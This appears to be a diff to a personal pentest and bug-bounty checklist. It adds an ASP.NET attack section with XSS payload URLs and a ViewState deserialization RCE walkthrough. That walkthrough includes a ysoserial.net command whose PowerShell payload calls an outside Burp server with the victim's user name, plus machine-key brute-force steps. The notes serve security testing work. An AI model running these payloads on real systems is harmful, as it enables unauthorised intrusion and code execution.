@@ -28,7 +28,7 @@ Analyze js file
 https://aditya-narayan.medium.com/easy-bounties-javascript-js-file-analysis-72ba5eb44822
 -----------------------------------------------------------------------------------
 
-If the Appliction is behing the WAF (WA > IP HistoryF Bypass)
+If the Appliction is behing the WAF (WAF Bypass)
 ----------------------------------------------
 Method-1 Check in https://viewdns.info/ > IP History
 Method-2 Check SPF record in https://mxtoolbox.com > Transcript
@@ -942,6 +942,40 @@ https://medium.com/@knownsec404team/the-analysis-of-drupal-1-click-to-rce-ad7799
 https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
 if drupal using 7.x version https://medium.com/@yasmeena_rezk/drupal-7-x-exploitation-7eb1c7cfa4dc
 
+--------------------------------------------------------------------------------------------------------
+Check IF Application's tech stack is ASP.NET
+-------------------------------------------
+Server Banner Exposed (server version)
+Lack of Security Headers (hsts,csp,x-xss,iframe etc.)
+Default Page Found (/iisstart.htm) check for exploit if found
+Version 4.0.30319 Vulnerable ( X-ASPNET-Version)
+Improper Error Handling (stack trace)
+ASP.NET Trace.AXD Information Leak (/trace.axd)
+Directory Listing
+WSDL Disclosure
+ASP.NET debugging enabled (DEBUG in method and in header Command: stop-debug)
+XSS (domain.com/(Z("onerror="alert%601%60"))/exist.aspx, domain.com/(Z("onerror="confirm%60Redirect%20Login%60"))/exist.aspx)
+Microsoft IIS Tilde Character Short File/Folder Name Disclosure (Burp extention IIS tide enumuration scanner)
+ASP.NET ViewState without MAC enabled (Burp extention - view state)( If you found check for RCE by below reference)
+
+ASP.NET RCE via viewstate
+------------------------
+Use Burp extention - view state
+Using the extention we get MAC is enabled or desabled (try to check in every POST endpoint);
+1. If disabled: 
+	a. Use the https://github.com/pwntester/ysoserial.net  ( to install https://medium.com/@hypri0n/run-ysoserial-exe-on-kali-linux-47b344ddff27)
+		ysorial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateformatter 0c "powershell.exe Invoke-WebRequest -uri http://Burp-server.com/$env:UserName"
+	b. Copy the payload that are getting and pase in view state parameter value and send the POST request > check the burp server.
+		read - https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/, 
+				https://mrknight.medium.com/chaining-multiple-website-vulnerabilities-my-first-bug-hunt-628721499897
+				https://book.hacktricks.wiki/en/pentesting-web/deserialization/exploiting-__viewstate-parameter.html?highlight=viewstate#what-is-viewstate
+				if you need reverse shell https://medium.com/@iamroot101/pov-htb-writeup-a680bd0742df
+2. If enable try to brute force machine key:
+	a. install this tool on windows. https://github.com/orwagodfather/AspDotNetWrapper-Edited-
+	  use- AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <viewstate> --decrypt --purpose=viewstate  --modifier=<__VIEWSTATEGENERATOR> --macdecode
+	b. replace the <viewstate> to viewstate= parameter value  in the source replace the <__VIEWSTATEGENERATOR> to __VIEWSTATEGENERATOR= parameter value  in the source
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------	
+
 If the application uses IIS server then try this tool
 ----------------------------------------------------------
 https://github.com/sw33tLie/sns?tab=readme-ov-file
@@ -954,9 +988,7 @@ anon ady
 
 Read for wireless PT - https://allabouttesting.org/wifi-penetration-testing-checklist/#google_vignette, https://gbhackers.com/wireless-penetration-testing-checklist-a-detailed-cheat-sheet/
 						https://github.com/ricardojoserf/wifi-pentesting-guide?tab=readme-ov-file#22
-						
-						
-Recover deleted data from android - https://infosecwriteups.com/revealed-best-way-to-recover-lost-or-deleted-data-from-smartphones-531332dece00
+						make respberry pi for wardriving https://infosecwriteups.com/wardrive-without-a-gps-module-and-wifi-adapter-that-supports-monitor-mode-but-a-raspberry-pi-b00d5d85cfa
 
 thin client pen testing:
 https://medium.com/@m14r41/thick-client-pentesting-guide-95529a980ea4
